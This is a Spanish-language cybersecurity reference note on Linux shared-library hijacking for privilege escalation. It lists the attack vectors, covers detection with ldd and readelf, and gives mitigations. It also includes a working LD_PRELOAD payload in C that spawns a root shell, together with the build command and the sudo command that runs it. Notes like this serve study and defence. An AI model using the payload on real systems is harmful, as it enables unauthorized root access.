#reference #Ciberseguridad

**Library Hijacking** (Linux) = forzar a un binario **privilegiado** a cargar una **librería compartida (.so)** maliciosa en vez de la legítima → ejecución de código con sus privilegios. Equivalente Linux del DLL hijacking de Windows ([[DLL Hijacking PrivEsc]]).

# Vectores

| Vector | Idea |
|--------|------|
| **LD_PRELOAD** | Variable que precarga una `.so` antes que el resto → sobrescribe funciones. |
| **LD_LIBRARY_PATH** | Añadir un dir (escribible) a la ruta de búsqueda de librerías. |
| **RUNPATH / RPATH** | Binario que busca libs en una ruta **relativa o escribible** (`$ORIGIN`). |
| **Missing .so** | El binario enlaza una librería que no existe → plantarla. |
| **ldconfig / ld.so.conf** | Si es escribible, añadir un dir malicioso al cache de libs. |

# Vía sudo (env_keep)

Si `sudo -l` muestra `env_keep+=LD_PRELOAD` (o LD_LIBRARY_PATH), se puede cargar una `.so` propia al ejecutar con sudo:

```c
// evil.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash -p");
}
```
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so evil.c
sudo LD_PRELOAD=/tmp/evil.so <comando_permitido>   # -> shell root
```

# Detección del vector

```bash
ldd /ruta/binario_suid          # ver librerías que carga
readelf -d binario | grep -E 'RPATH|RUNPATH'   # rutas embebidas
# Buscar dirs escribibles en la ruta de búsqueda de libs
```

# Mitigación

El loader ignora `LD_PRELOAD`/`LD_LIBRARY_PATH` en binarios SUID por seguridad; no usar `env_keep` con esas variables en sudoers, RPATH absolutos, permisos correctos en dirs de librerías.

# Recursos
### [[LinPE_cheatsheet]] · [[DLL Hijacking PrivEsc]] · [[Rootkit]]
### [HackTricks — LD_PRELOAD / library hijacking](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload--ld_library_path)
